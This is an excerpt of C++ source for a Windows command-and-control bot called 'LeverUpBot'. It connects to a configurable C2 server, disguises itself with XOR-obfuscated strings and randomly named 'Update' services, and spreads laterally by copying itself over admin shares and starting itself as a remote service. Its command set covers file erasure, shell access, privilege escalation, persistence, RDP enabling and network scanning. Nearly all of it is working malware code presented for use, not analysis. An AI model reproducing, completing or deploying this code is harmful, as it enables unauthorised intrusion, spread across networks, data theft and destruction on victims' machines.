...
#include <winsvc.h>        // for service APIs
#include <random>  
...
#pragma comment(lib, "mpr.lib")    // for WNet functions
#pragma comment(lib, "advapi32.lib") // for service functions

#define BUFFER_SIZE 4096

// Configuration
std::string C2_SERVER_IP = "192.168.1.6";  // Change this
int C2_SERVER_PORT = 8080;

std::atomic<bool> g_running(true);
SOCKET g_socket = INVALID_SOCKET;

// Simple XOR deobfuscator (key = 0xAA)
std::string deobfuscate(const char* data, size_t len) {
...
#define OBF(str) deobfuscate(str, sizeof(str)-1)

// --- Obfuscated strings (corrected) ---
std::string adminShare = OBF("\xCB\xCE\xC7\xC3\xC4\x8E");       // "admin$"
std::string ipcShare   = OBF("\xE3\xFA\xE9\x8E");               // "IPC$"
std::string svcPrefix  = OBF("\xFF\xDA\xCE\xCB\xDE\xCF");       // "Update"
std::string dispPrefix = OBF("\xFF\xDA\xCE\xCB\xDE\xCF\x8A\xF9\xCF\xD8\xDC\xC3\xC9\xCF"); // "Update Service"
...
std::string handleLateral(const std::string& target,
                          const std::string& username = "",
                          const std::string& password = "") {
    std::string result = "[LATERAL]\n";
    result += "Target: " + target + "\n";

    // Must run as admin for remote SCM access
    if (!isRunningAsAdmin()) {
        result += "ERROR: Lateral movement requires Administrator privileges.\n[END]\n";
        return result;
    }

    // --- Generate random service name (e.g., "Update<5 digits>") ---
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(10000, 99999);
    int randNum = dis(gen);
    std::string serviceName = svcPrefix + std::to_string(randNum);
    std::string displayName = dispPrefix + std::to_string(randNum);

    // --- Random remote filename (same as service name + ".exe") ---
    std::string remoteExeName = serviceName + ".exe";

    // --- Build paths ---
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);
    std::string localExe = exePath;

    // Remote path: \\target\admin$\temp\random.exe
    std::string remoteDir = "\\\\" + target + "\\C$\\temp";
    std::string remoteExe = remoteDir + "\\" + remoteExeName;
    std::string quotedRemoteExe = "\"" + remoteExe + "\"";   // quoted for service

    // --- Connect to IPC$ (authenticate) ---
    NETRESOURCEA nr = {0};
    nr.dwType = RESOURCETYPE_DISK;
    std::string ipcFull = "\\\\" + target + "\\" + ipcShare;
    nr.lpRemoteName = (LPSTR)ipcFull.c_str();

    DWORD ret;
    if (username.empty()) {
        ret = WNetAddConnection2A(&nr, NULL, NULL, CONNECT_TEMPORARY);
    } else {
        ret = WNetAddConnection2A(&nr, (LPSTR)password.c_str(), (LPSTR)username.c_str(), CONNECT_TEMPORARY);
    }
    if (ret != NO_ERROR) {
        result += "WNetAddConnection2 failed: " + std::to_string(ret) + "\n";
        result += "[END]\n";
        return result;
    }

    // --- Create remote temp directory (ignore if exists) ---
    CreateDirectoryA(remoteDir.c_str(), NULL);

    // --- Copy bot executable ---
    if (!CopyFileA(localExe.c_str(), remoteExe.c_str(), FALSE)) {
        result += "CopyFile failed: " + GetLastErrorString() + "\n";
        WNetCancelConnection2A(nr.lpRemoteName, 0, TRUE);
        result += "[END]\n";
        return result;
    }
    result += "File copied to " + remoteExe + "\n";

    // --- Service binary path (with -service flag) ---
    std::string binaryPath = quotedRemoteExe + " -service";

    // --- Open remote SCM ---
    SC_HANDLE hSCM = OpenSCManagerA(target.c_str(), NULL, SC_MANAGER_CREATE_SERVICE);
    if (!hSCM) {
        result += "OpenSCManager failed: " + GetLastErrorString() + "\n";
        WNetCancelConnection2A(nr.lpRemoteName, 0, TRUE);
        result += "[END]\n";
        return result;
    }
    ...
    if (!hService) {
        ...
        if (err == ERROR_SERVICE_EXISTS) {
            result += "Service already exists, attempting to start it.\n";
            hService = OpenServiceA(hSCM, serviceName.c_str(), SERVICE_START);
            if (!hService) {
                result += "OpenService failed: " + GetLastErrorString() + "\n";
            ...
            result += "CreateService failed: " + GetLastErrorString() + "\n";
            CloseServiceHandle(hSCM);
            WNetCancelConnection2A(nr.lpRemoteName, 0, TRUE);
            result += "[END]\n";
            return result;
    ...
    if (!StartServiceA(hService, 0, NULL)) {
        ...
        if (err == ERROR_SERVICE_ALREADY_RUNNING) {
            ...
            result += "StartService failed: " + GetLastErrorString() + "\n";
        }
    } else {
    ...
    result += "Lateral movement completed.\n[END]\n";
    return result;
}
...
std::string handleErase(const std::string& filepath) {
    std::string result = "[ERASE]\n";
    result += "Attempting to delete: " + filepath + "\n";
    ...
    if (DeleteFileA(filepath.c_str())) {
        ...
        if (err == ERROR_FILE_NOT_FOUND) {
            ...
            result += "Delete failed: " + GetLastErrorString() + "\n";
        }
    }
...
void handleCommand(const std::string& command) {
    ...
    if (command == "sysinfo") {
    ...
    else if (command.find("erase ") == 0) {
        std::string filepath = command.substr(6); // after "erase "
        response = handleErase(filepath);
    }
    ...
    else if (command.find("lateral ") == 0) {
        std::string params = command.substr(8); // after "lateral "
        size_t spacePos = params.find(' ');
        if (spacePos != std::string::npos) {
            // Format: lateral <target> <username> <password>
            std::string target = params.substr(0, spacePos);
            std::string remaining = params.substr(spacePos + 1);
            size_t space2 = remaining.find(' ');
            if (space2 != std::string::npos) {
                std::string username = remaining.substr(0, space2);
                std::string password = remaining.substr(space2 + 1);
                response = handleLateral(target, username, password);
            } else {
                // Only target and username (password missing) – treat as just target
                response = handleLateral(target, remaining, "");
            }
        } else {
            // No spaces – just target
            response = handleLateral(params, "", "");
        }
    }
        ...
        response = "[HELP] Available commands: sysinfo, enablerdp, dir, kill <pid>, erase <file>, launch <app/file>, privesc [username] [password], lateral <target> [username] [password], shell, persist, networkscan, store <path>, retrieve <path>, help, exit\n";
    }
...
void WINAPI ServiceControlHandler(DWORD dwCtrl) {
    switch (dwCtrl) {
        ...
        case SERVICE_CONTROL_SHUTDOWN:
            ...
            g_running = false;               // signal bot to exit
...
void WINAPI ServiceMain(DWORD argc, LPSTR* argv) {
    ...
    g_StatusHandle = RegisterServiceCtrlHandlerA("LeverUpBot", ServiceControlHandler);
    ...
    // ----- Main bot loop (without initial sysinfo) -----
    // We need a non‑blocking way to check for socket commands.
    // The simplest is to run the socket loop in a separate thread.
    std::thread botThread([]() {
        // Reconnect to C2 server (uses same global g_socket)
        while (g_running) {
            if (connectToServer()) {
                // Enter the command receive loop
                char buffer[BUFFER_SIZE];
                while (g_running) {
                    int bytes = recv(g_socket, buffer, BUFFER_SIZE - 1, 0);
                    if (bytes > 0) {
            ...
            if (g_running) Sleep(10000); // reconnect delay
        }
    });
...
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    ...
    if (cmdLine.find("-service") != std::string::npos) {
        SERVICE_TABLE_ENTRYA ServiceTable[] = {
            { (LPSTR)"LeverUpBot", (LPSERVICE_MAIN_FUNCTIONA)ServiceMain },
            { NULL, NULL }
        };
        if (!StartServiceCtrlDispatcherA(ServiceTable)) {
            return 1; // service failed to start
        }
        return 0; // service exited
    }

    // Normal interactive mode (original code)
    int argc;
    ...
    while (g_running) {
        if (connectToServer()) {
            botLoop();                 // original botLoop (sends sysinfo, then handles commands)
            if (g_running) Sleep(10000);
        } else {
            Sleep(10000);
        }
    }
